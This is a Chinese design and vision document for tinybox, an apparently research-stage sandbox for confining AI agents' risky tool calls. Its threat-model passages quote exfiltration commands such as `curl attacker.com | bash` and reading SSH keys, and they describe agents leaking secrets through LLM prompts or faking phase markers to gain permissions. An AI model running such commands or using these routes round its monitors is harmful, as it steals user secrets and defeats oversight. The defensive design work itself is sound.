# tinybox — 项目愿景与研究方向

> **北极星文档。** 本文件定义 tinybox 作为研究制品*为何存在*、
> *要成为什么*。它是前瞻的、愿景性的。要读今天缺陷的逐行审计与修复
> 轨，看 [PLAN.md](PLAN.md)（里程碑 M0–M4）。实际实施顺序与验收门见
> [CAPABILITY_PLAN.md](CAPABILITY_PLAN.md)（C0–C6）；开发约定与决策日志
> 见 [../AGENTS.md](../AGENTS.md)。冲突时：PLAN 管当前事实，
> CAPABILITY_PLAN 管实施顺序，本文管长期方向。

状态：**草案，2026-08-16。** 打上 `vision-v1` 标签后即为定稿。

---

## 1. 论点

> **不要虚拟化机器；要隔离执行。**
>
> 更精确地说：**不要隔离整个 Agent，要隔离 Agent 的高风险执行能力。**

Agent 工作负载——LLM 工具调用、代码解释器会话、自主编码 Agent——
同时具备四个所有经典容器负载都不具备的特性：

1. **高频、短命**——每个任务一个沙箱，期望 ms 级启动、亚秒级拆除。
2. **不可信、模型生成代码**——"载荷"本质是对抗性的，不是审计过的
   服务二进制。
3. **任意 syscall 面**——shell、编译器、包管理器、网络客户端，甚至
   `git clone` 攻击者控制的仓库。
4. **分阶段的能力需求**——`pip install` 要出口网络；编译要 FS 写；
   测试要更多内存；推理一个都不要。

为这种负载设计的沙箱必须同时做到：

| 要求 | 含义 |
|---|---|
| 强 | 能禁锢对抗性代码：不漏主机 FS、不外泄网络、不提权 |
| 轻 | ms 级冷启动、MB 级内存开销、无 VMM |
| Agent 感知 | 每任务、随时间变化的能力策略——不是创建时一次性烤死 |

现有隔离方案分布在这个权衡面的不同点上。**没有一个占据 tinybox 目标的
那个角。**

| 系统 | 隔离强度 | 启动/内存开销 | Agent 感知策略 |
|---|---|---|---|
| 裸进程 | 弱 | 最小 | 无 |
| runc / Docker | 中（为*可信服务*设计；策略**静态、容器级**） | 低 | 无 |
| gVisor | 中强（用户态内核） | 中（syscall 陷入开销） | 无 |
| Firecracker / Kata microVM | 强（硬件虚拟化） | 高（秒级冷启动、GB 级、VMM 攻击面） | 无 |
| **tinybox（目标）** | 中强（精心组合的内核原语） | 低（runc 级） | **是——动态能力策略** |

空缺很精确：**没有任何现有系统既做到 runc 级轻量、又做到 Agent 感知。**
tinybox 就是去占那个角。

---

## 2. 空缺——为什么这不是 runc 的重写

对今天代码树的诚实解读：tinybox 的*静态*隔离骨架
（namespaces + overlayfs + cgroups + seccomp + capabilities）在功能空间里
是 runc 的一个子集。如果项目停在 M4，它就是一个说得过去的教学性
重写，仅此而已。

把 tinybox 从"runc 子集"提升为"研究制品"的，是 runc/Docker/Firecracker
里都不存在、且只为 Agent 工作负载而生的单一一层：

> **Agent 感知的动态能力隔离。**

这一层是面试官必问之问——"*为什么不用 runc 就行了？*"——的答案。
本文档余下部分围绕把这一答案变得具体、可辩护、可落地而展开。

---

## 2.5 部署拓扑——把什么放进沙箱

"Agent Sandbox"不是固定架构，而是一类针对 Agent 工作负载的隔离执行
环境。它可以整个把 Agent 关进去，也可以只把 Agent 发起的高风险执行
操作关进去。三种拓扑：

### 模式 A：整个 Agent 在沙箱里
```
┌─────────────────────────────┐
│          Sandbox            │
│   Agent Runtime             │
│     │  LLM / Tools / Memory │
│     └─ Execution            │
└─────────────────────────────┘
              ✕ Host
```
隔离边界简单——Agent 的一切动作都在沙箱内。代价：LLM 推理、上下文、
记忆这些本可与主机共生的部分也被关进来，启动/内存开销大，且 LLM API
流量也要经沙箱出口（性能/复杂度）。

### 模式 B：Agent 在外，所有执行在沙箱里
```
             Agent
               │ Tool Call
               ▼
         Sandbox Manager ──▶ Sandbox (bash/python/compiler/test/git)
```
Agent runtime 在 host，每次工具调用都丢进沙箱。轻量，但连"读 workspace"
这种低风险操作也走沙箱，无谓延迟。

### 模式 C：混合（tinybox 目标拓扑）✅
```
                 Agent（在 host）
          │                              │
   低风险能力                        高风险能力
   read /workspace                  bash / python
   edit /workspace                  npm install
   LLM API 调用                     compiler / test
   reasoning / memory               git clone 第三方 repo
          │                              │
          ▼                              ▼
   in-host（仍受 Landlock            per-task Sandbox
   FS 策略约束）                     (namespace+cgroup+seccomp)
```
**Agent runtime 在 host，但高风险工具调用路由进 per-task 沙箱；低风险
操作在 host 执行——仍受能力描述符约束。** 这契合 Coding Agent 实际
工作模式（read/edit 频繁、bash/python 才是危险源），也契合"高频短命"
负载对 ms 级启动的要求。

> **关键约束（易被忽视）：** 模式 C 不是"低风险=in-host 不受限"。read
> 若在 in-host 且无 FS 策略，Agent 可直接 `cat ~/.ssh/id_rsa` 再外泄。
> 故能力描述符必须在**两层**强制：
> - **in-host 层**：用 Landlock 给 Agent runtime 进程本身套上 FS
>   策略（只许读 `/workspace/**`）——这把 Landlock 从"研究轨 R1 的 FS
>   执行原语"提升为**模式 C 的必需组件**。
> - **in-sandbox 层**：seccomp + namespaces + cgroup 限制高风险执行。

> **诚实的威胁模型：LLM API 通道外泄执行沙箱关不掉。** 即使 in-host
> FS 策略封住 `~/.ssh`，Agent 仍能把**它合法可读的数据**（workspace 里
> 的 `.env`、repo 里的 secret）塞进下一次 LLM API 调用的 prompt 发出
> 去。该流量加密，sandbox/proxy 做内容审查很脆；若 LLM API 调用本身
> 在 in-host（模式 C 的自然选择），sandbox 根本看不见。故模式 C 的
> 执行沙箱挡的是"直接主机破坏 + 朴素外泄（`curl attacker.com`）"，
> **挡不住"经 LLM prompt 外泄合法可读数据"**——这层要么靠 FS 策略对
> 可读路径本身保守（workspace 不放明文 secret），要么留给上层（编排器
> 做 prompt 审计）。这不是模式 C 的失败，是威胁边界要诚实标注。

### 5 个设计驱动（Coding Agent 专属）
| 驱动 | 含义 | 对应 |
|---|---|---|
| 启动延迟 | 每任务一沙箱，ms 级否则成本爆炸 | RQ2 |
| 内存开销 | 可能并发几十上百 Agent | RQ2 |
| 隔离强度 | 载荷是不可信生成代码 | RQ3 |
| 可重置性 | 任务结束 destroy 或 snapshot→restore（overlayfs COW 天然支持） | — |
| 资源控制 | 挡 fork bomb / 内存炸弹 / 磁盘耗尽 / CPU 占满 / 网络滥用 | RQ3 |

注：tinybox 的"可重置"作用域是**沙箱状态**（rootfs + cgroup + netns），
不含 Agent 的记忆/上下文（那是编排器的职责）。

### 集成接口——给 Agent 框架调用的契约

模式 C 的"高风险工具调用路由进沙箱"要有个 Agent 框架能调的接口。
tinybox 同时提供 CLI 与 HTTP API 两副面孔：

**一次性工具调用（无状态，每次冷启动）**
```bash
tinybox run --policy /tmp/task-policy.json -- <command...>
# → stdout / stderr / exit code 回给调用方（如 OpenCode 的 bash 工具）
```
`--policy` 指向能力描述符（用户授权的任务契约）。这是 v1 最简集成：
OpenCode 把它的 bash 工具从裸 `bash` 换成 `tinybox run --policy ... -- bash`。

**有状态会话（同一 rootfs 下连续操作，避免每调冷启动）**
```
POST /api/sandboxes   {policy, command?}     → {id}          # 建沙箱
POST /api/sandboxes/:id/exec  {command}     → stdout/stderr # 走 setns 进沙箱执行
GET  /api/sandboxes/:id/logs               → 流式输出
DELETE /api/sandboxes/:id                                   # 销毁
```
适合 `cd && build && test` 这类共享 rootfs 的序列。需 P1-5（exec 走
`setns`）修复后可用。

**演进路径**
- v1：一次性 `tinybox run`（每次 cold start）——落在 M2 的 P1-4
  （`CreateRequest`/`--policy` 接能力描述符）。
- v1+：有状态 `exec` 会话——落在 M2 的 P1-5。
- v2：**预热沙箱池**（RQ4/R2）——预 spawn 一批 base-policy 沙箱，
  `exec` 进去，warm start 到 ms 级，挡掉 Coding Agent 高频调用的大头
  冷启动成本。

> 接口契约要点：调用方（编排器）拿到的是 **stdout/stderr/exit code**，
> 与裸 shell 工具的语义一致——故 OpenCode 类框架的 bash 工具替换成
> tinybox 调用是**透明**的，不需要改 Agent 的推理循环。策略（能力
> 描述符）由用户/编排器在开任务时提供，不由 Agent 自己决定。

---

## 3. 核心创新——Agent 感知的动态能力隔离

三条原则。每一条都直接对比 runc/Docker 的策略建模方式，且每一条都
只因为载荷是对抗性、分阶段、自生成的 Agent 而非可信服务才需要。

> **能力描述符由谁授予？**——见第 6 节 R1 与第 8 节关系图。简言之：
> 用户/编排器在开任务时声明本任务的能力预算（"这任务不需要网络就
> 完全不给网络"），runtime 内核态强制，Agent 自身无权给自己授权。
> 这个预算既是安全边界，也是**防 Agent 跑偏的任务契约**——任务范围
> 超出声明的预算即被拒（比如用户说"纯离线分析"，Agent 想去拉网就被
> 挡，既挡 exfil 也挡跑偏）。

### 3.1 能力而非信任

- **runc/Docker 框架**："这个容器可信吗？" → 在 `create` 时烤一个静态
  策略，期望负载别漂移。
- **tinybox 框架**："这个 Agent 任务*现在*有哪些能力？" 沙箱由能力
  描述符描述，而非信任标签：

```text
Agent 沙箱能力描述符
│
├── FS 能力
│    └── /workspace/**          (读写)
│    └── /tmp/**                (读写, tmpfs, 有容量上限)
│
├── 网络能力
│    └── api.openai.com:443      (允许)
│    └── pypi.org:443           (允许, 仅 pip-install 阶段)
│    └── *                      (拒绝)
│
├── Syscall 能力
│    └── 白名单 (~200 syscalls, clone flags 已屏蔽)
│
└── 资源能力
     ├── 2 CPU
     ├── 4 GB 内存
     └── 100 pids
```

一个 Agent 发出 `os.system("curl attacker.com | bash")` 失败，不是因为
`curl` 二进制被禁，而是因为 `网络能力 = 拒绝`（对 `attacker.com`）。
策略活在能力层，而非二进制层。

### 3.2 动态而非静态

- **runc**：seccomp filter、capability set、网络策略都是容器级的，在
  `runc create` 时固定，生命周期内不可变。
- **Agent 执行是分阶段的**：

```text
Agent
 │
 ├── pip install 阶段      → 要 网络(pypi.org)、FS(/workspace 写)
 ├── 编译阶段              → 要 FS(/workspace 写)、CPU(2)
 ├── 测试阶段              → 要 FS(/workspace 读)、内存(8 GB)、无网络
 └── 推理阶段              → 要 网络(api.openai.com)、无 FS 写
```

tinybox 的策略引擎按阶段授予能力，并在阶段结束时**撤销**。一个
`pip install` 在安装阶段关闭后突然想外泄，会撞上被拒的网络能力——
哪怕同样的调用几分钟前还能成功。这在 runc 里做不到，除非销毁容器
重建。

> **已知约束（seccomp 单调性）**：seccomp filter 只能叠加不能撤销，
> 所以 syscall 维度的 grant 不能双向。真双向的动态层落在：网络维度
> （eBPF map 可热更新）、资源维度（cgroup 可 resize）、FS 维度
> （fanotify-perm 每次仲裁可双向）。syscall 白名单是**静态底盘**。
> 想做 syscall 级的双向仲裁只能用 `SECCOMP_RET_USER_NOTIF`，但有
> 每次 syscall 的 userspace 往返延迟。详见 AGENTS.md 决策日志
> 2026-08-16 条目。

### 3.3 行为驱动

策略引擎消费实时事件流，而非靠硬编码阶段标记开/关能力：

```text
                  Agent 进程
                        │
                        ▼
             ┌─────────────────────┐
             │  行为监控器          │
             │  ┌───────────────┐  │
             │  │ seccomp RET_LOG│  │  ← syscall 流
             │  ├───────────────┤  │
             │  │ fanotify      │  │  ← FS 访问流
             │  ├───────────────┤  │
             │  │ eBPF (egress) │  │  ← 网络流
             │  └───────┬───────┘  │
             └──────────┼──────────┘
                        │ 事件
                        ▼
               ┌──────────────┐
               │ 策略引擎     │  ← 阶段推断 + 能力授予/撤销
               └──────┬───────┘
                      │
                      ▼
            动态调整沙箱
            (seccomp filter 叠加、eBPF egress 更新、cgroup resize)
```

选这三个原语是因为它们是内核的天然观测点：`seccomp(SECCOMP_RET_LOG)`
看 syscall，`fanotify` 看 FS，eBPF（cgroup-skb / sockmap）看出口。
无用户态介入、无 ptrace——Agent 全速运行，监控器在沙箱威胁面之外
观测。

> **执行 vs 审计的分工**：proxy 是**网络执行层**（L7，按 host 精确
> allow/deny，契合"no bridge"约束且避免脆的 TLS-SNI 解析）；eBPF
> 出口是**审计/观测层**，不做执行。Landlock 是 **FS 执行层**候选
> （内核态、路径策略、可非特权）；fanotify 是 **FS 审计层**。

这三条原则合起来回答"为什么不用 runc"：**runc 的策略是静态的、
为可信服务设计的；Agent 负载是动态的、对抗性的，需要每任务可变策略。**

---

## 4. 研究问题

| ID | 问题 |
|---|---|
| **RQ1**（隔离） | 能否用**细粒度 Linux 内核原语只隔离 Agent 的高风险执行能力**（而非整个 Agent），达到 Agent 负载所需的隔离边界，且不引入 MicroVM 虚拟化？ |
| **RQ2**（性能） | 对比 Firecracker microVM，tinybox 能在多大程度上降低启动延迟、内存开销、syscall 吞吐？量化这条 Pareto 曲线。重点看冷启动+内存（syscall 吞吐对 tinybox 与 Firecracker 都是近原生，主要拉开 gVisor）。 |
| **RQ3**（安全） | 面对 syscall / FS / 提权 / 容器逃逸 / 网络 / 资源耗尽 / **LLM-prompt 外泄**攻击，tinybox 挡住了什么、在哪里破？（诚实标注模式 C 的 LLM 通道外泄边界——见 §2.5。） |
| **RQ4**（Agent 专属） | Agent 执行模型能否实现通用容器做不到的开销削减——例如预热短命沙箱池、按任务类别做策略特化、按阶段预测式授予能力？ |

RQ4 是延伸目标，若被肯定回答，就是本项目对该领域的真正贡献。

---

## 5. 现状（诚实，截至 2026-08-16 M2 后复审）

### 已建（静态隔离骨架）

- PID / Mount / UTS / Net namespaces；`CLONE_NEWNET` 始终 unshare
  （M1 之后修复）。
- overlayfs COW rootfs + `pivot_root`，退出自动清理。
- cgroup v2 限制：`memory.max`、`cpu.max`、`pids.max`。
- seccomp 白名单（~200 syscalls）；`clone` flag 屏蔽禁止 `CLONE_NEW*`；
  9 个逃逸/干扰 syscall 已删。
- capabilities：14 个危险 cap 下调 + bounding set 经
  `PR_CAPBSET_DROP` 清空。
- OCI `config.json` 解析（字段子集；namespace/user 语义仍有开放缺口）。
- axum HTTP 控制面：`POST/GET/DELETE /api/sandboxes`、`GET /metrics`。
- Docker registry 镜像拉取 + 本地镜像管理。
- `tinybox exec` 通过直接 `setns` 进入目标 namespace，并做基础 cgroup 名称校验。

### 修复轨状态

M1 的四个原始 P0 已解决：无 bridge 宿主泄漏、clone namespace flags 已
屏蔽、逃逸 syscall 已删、bounding set 已清空。M2 加入了 OCI 字段、特殊
文件系统、daemon 状态和 setns exec，但后续复审发现这些路径仍有正确性与
验收缺口；当前是 rootful 实验性骨架，不是生产安全边界。详见 PLAN.md A1–A6。

### 未建（研究核心）

- 无行为监控器：无 `SECCOMP_RET_LOG` 捕获、无 `fanotify` 接线、
  无 eBPF 程序。
- 无能力模型：今天的策略是静态 seccomp 白名单 + cap 下调集，不是
  每任务描述符。
- 无动态策略引擎：无阶段推断、无能力授予/撤销循环。
- 无评测套件：无对 Firecracker / runc 的基准脚本。

研究核心是下文 R0–R3 的工作。

---

## 6. 路线图

两条轨并行，互相参照：

- **修复轨（M0–M4，见 [PLAN.md](PLAN.md)）**——把今天声称的功能做到
  合规。M1 已完成；M2 在复审后重开。
- **研究轨（R0–R3，本文档）**——构建让 tinybox 区别于 runc 的
  Agent 感知层。

依赖规则：**R0 可与 M2 并行**。**R1 只在 M2 复审项 A1–A5 关闭后开始**；
不能仅以已有 M2 tag 作为前置条件满足的证据。

### 修复轨（PLAN.md M0–M4——摘要，详见 PLAN.md）

- M0 ✅ 诚实基线
- M1 ✅ P0 隔离漏洞关闭（2026-08-16）
- M2 ⚠️ 复审后重开——曾加入 P1-1 OCI 字段、P2-1 `/dev`/`/tmp`/`/sys`
  已提前至此、P1-3 daemon 状态、P1-4 CreateRequest、P1-5 exec 走 `setns`）
- M3——纵深（P2-2 cgroup v2 校验、P2-3/P2-4 内容寻址镜像 + registry
  流式拉取、P2-5 daemon 持久化 + 日志 + 鉴权）
- M4——打磨（P3-1..P3-6）

### 研究轨（本文档）

#### R0——行为插桩（M1 之后；与 M2 并行）

接通三个内核观测点，通过 HTTP API 暴露每沙箱事件流。先不做策略决策
——只做数据面。

- `seccomp(SECCOMP_RET_LOG)` → syscall 事件流（pid、syscall 号、参数）。
- `fanotify`（在 overlay 上做 mount 标记）→ FS 访问流
  （path、mask: open/read/write/execute）。
- eBPF（cgroup-skb 出口 + sockmap）→ 网络事件流
  （目的地址/端口、可行则取 TLS ClientHello 的 SNI）。
- `GET /api/sandboxes/:id/audit` → JSON 事件流（或 SSE 实时尾随）。
- `GET /api/sandboxes/:id/audit/summary` → 聚合直方图。

验收：一个沙箱化的 `pip install numpy` 产出 JSON 审计日志，枚举每一类
syscall、每个触碰的 FS 路径、每个联系的网络端点。

#### R1——能力模型 + 动态策略引擎（M2 之后）

在 R0 事件流之上构建策略层。

- 定义 `CapabilityDescriptor`（FS 路径、网络端点、syscall 集、
  CPU/内存/pids）为 `src/policy.rs` 里的一等类型。
- `POST /api/sandboxes` 接受一份策略文档（**由用户/编排器声明的能力
  预算——即任务契约**）；tinybox 在 spawn 时编译为 seccomp filter +
  fanotify 策略 + eBPF 出口白名单。
- 阶段推断：一个状态机（最终可用模型）消费 R0 事件流，发出阶段转换
  （`install → compile → test → inference`）。
- 能力授予/撤销：阶段转换时，叠加 seccomp filter、更新 eBPF egress map、
  resize cgroup——皆无需重启沙箱。

验收：一个策略文档声明"网络(pypi.org)仅在 install 阶段允许"的沙箱，
成功跑完 `pip install`，30 秒后拒绝一次外泄尝试——同一进程、不重启、
有效策略不同。

> **R1 v1 的阶段信号用编排器显式 marker**（编排器知道自己阶段），
> 配行为引擎交叉校验 marker 与事件流是否一致（防 Agent 撒谎骗权限）。
> 纯行为推断的阶段识别留给 R6——那是真正的研究赌注。

#### R2——评测套件（R1 之后）

三方基准，对比 Firecracker microVM 与 runc，跑固定的 Agent 负载套件
（代码解释器、装包并测、带网络的工具调用）。

指标：
- 冷启动延迟（ms）。
- 热启动延迟（ms，池化后）。
- 空闲内存开销（MB）。
- syscall 吞吐（ops/s，原生 vs 沙箱）。
- 端到端任务延迟（s）。
- 策略切换延迟（µs，tinybox 独有——动态性的代价）。

回答 RQ2。产出一条 Pareto 曲线（隔离强度 × 开销），三个系统都画上。

#### R3——安全评测（R1 之后）

对抗性测试套件覆盖：syscall 攻击、FS 逃逸、提权、容器逃逸原语、
网络外泄、资源耗尽、策略引擎绕过尝试。每个测试以脚本形式记在
`scripts/attacks/` 下。

回答 RQ3。产出一张防御矩阵（攻击 × 系统 × 结果）。

### 延伸（研究轨 v1.0 之外）

- **R4——结果证明**：沙箱退出时发一份签名清单
  `{policy_hash, syscall_log_hash, fs_diff, egress_log_hash, exit_code}`，
  由 runtime 的密钥签名。任何持有 runtime 公钥的下游系统可验。
  这是*进程沙箱的远程证明*——VM 有（SEV-SNP、TDX），进程沙箱没有。
  > **注意**：严格说这是 **tamper-evident 完整性日志**而非
  > 硬件根远程证明（设计明确不用 VMM、runtime 与 Agent 同宿主、且
  > root），co-located 攻击者可胁迫 runtime；不要 overstating。
- **R5——Rootless 运行**：`CLONE_NEWUSER` + uid/gid 映射，daemon
  不再需要 root。与 PLAN.md 延伸项对齐。
- **R6——阶段预测式策略**：用轻量模型替换 R1 的状态机，从 syscall
  流预测下一个能力需求，在 Agent 请求*之前*就授予。这是真正的
  研究赌注；成功则肯定回答 RQ4。

---

## 7. 非目标（v1.0 明确不做）

- **MicroVM / VMM / 硬件虚拟化**（Firecracker、Kata、crosvm）。
  tinybox 由它们的缺席定义。MicroVM 只能在 R2 基准里作为*对照*出现，
  绝不作为 tinybox 的隔离机制。
- **多节点编排**——单机。
- **完整 OCI 规范合规**——仅核心字段（见 PLAN.md P1-1 今日支持的
  子集）。
- **GPU passthrough**——不做。
- **SELinux / AppArmor**——seccomp + capabilities（+ Landlock，加入时）
  是 LSM 故事。
- **Windows / macOS**——仅 Linux（kernel 5.10+ 基线）。

---

## 8. 与其它文档的关系

| 文档 | 角色 | 权威性 |
|---|---|---|
| [../README.md](../README.md) | 面向用户的概览、快速开始、功能列表 | 用户面 |
| [../AGENTS.md](../AGENTS.md) | 开发约定、阶段依赖、决策日志 | 约定 |
| [PLAN.md](PLAN.md) | 逐行问题审计 + 修复轨（M0–M4） | **今天的缺陷** |
| **VISION.md（本文档）** | 研究北极星 + 研究轨（R0–R3） | **明天的方向** |

冲突时：
- *今天什么坏了？* → PLAN.md。
- *它该成为什么？* → VISION.md。
- *这里怎么写代码？* → AGENTS.md。

---

## 9. 架构图（目标态，R1 之后）

```text
                       Agent 编排器
                              │
                              ▼ POST /api/sandboxes {policy, command}
                 ┌────────────────────────┐
                 │   tinybox runtime      │
                 │   (单一 Rust 二进制)    │
                 │                        │
                 │  ┌──────────────────┐  │
                 │  │ 策略引擎         │  │  ← 把策略文档编译为 BPF +
                 │  │                  │  │    fanotify + 出口 filter
                 │  │  阶段推断        │  │
                 │  │  授予 / 撤销     │  │
                 │  └────────┬─────────┘  │
                 │           │            │
                 │  ┌────────▼─────────┐  │
                 │  │ 行为监控器       │  │
                 │  │ seccomp RET_LOG  │  │
                 │  │ fanotify         │  │
                 │  │ eBPF 出口        │  │
                 │  └────────┬─────────┘  │
                 │           │            │
                 │  ┌────────▼─────────┐  │
                 │  │ 沙箱             │  │
                 │  │  PID/Mount/UTS/  │  │
                 │  │  Net namespaces  │  │
                 │  │  overlayfs rootfs│  │
                 │  │  cgroup v2       │  │
                 │  │  seccomp + caps  │  │
                 │  └────────┬─────────┘  │
                 │           │            │
                 └───────────┼────────────┘
                             ▼
                     Linux 内核（宿主）
                             │
                             ▼
                        宿主硬件

无 Guest OS。无 VMM。无 MicroVM。
```

---

## 10. 决策日志（愿景级）

### 2026-08-16 — 愿景定稿
- **决策**：tinybox 是研究制品，不是 runc 重写。北极星是**基于 Linux
  内核原语的 Agent 感知动态能力隔离**，明确*不用* MicroVM 虚拟化。
- **里程碑命名空间**：研究轨用 **R0–R3**（本文档），避免与 PLAN.md
  修复轨的 **M0–M4** 冲突。
- **依赖规则**：R0 可与 M2 并行；R1 在 M2 复审项 A1–A5 关闭后开始。
- **诚实基线**：今天的代码树是 rootful、实验性的*静态*隔离骨架，仍有
  PLAN.md A1–A6；不得表述为生产安全边界。
  研究核心（R0–R1）尚未建，是把项目从"runc 子集"抬升为"Agent 沙箱"
  的东西。
- **延伸标记**：R4（结果证明）、R5（rootless）、R6（阶段预测式策略
  用模型）是明确延伸目标，非 v1.0 承诺。
- **用户授权**：能力描述符由用户/编排器在开任务时声明（任务契约），
  runtime 强制，Agent 自身无授权资格。详见第 3 节引言与第 6 节 R1。
